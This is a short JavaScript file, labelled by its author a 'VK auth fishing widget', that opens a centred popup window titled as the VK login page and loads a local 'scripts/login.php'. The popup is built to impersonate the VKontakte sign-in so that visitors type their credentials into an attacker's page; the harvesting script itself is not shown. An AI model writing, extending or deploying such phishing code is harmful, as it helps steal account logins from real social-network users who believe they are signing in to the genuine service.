/*
 * @author: d32ds3c (ADM1N)
 * @name: VK auth fishing widget
 * @spcl: https://vk.com/bite_owl
 */

//Метод открытия модального окошка
function op() {//left/top

    //Координаты середины окна
    let left = (window.innerWidth - 700) / 2;
    let top = (window.innerHeight - 500) / 2;

    //Открываем окно
    let wind = window.open("scripts/login.php", "ВКонтакте | Вход", "width=700,height=400, left=" + left + ",top=" + top);

    return wind;

}
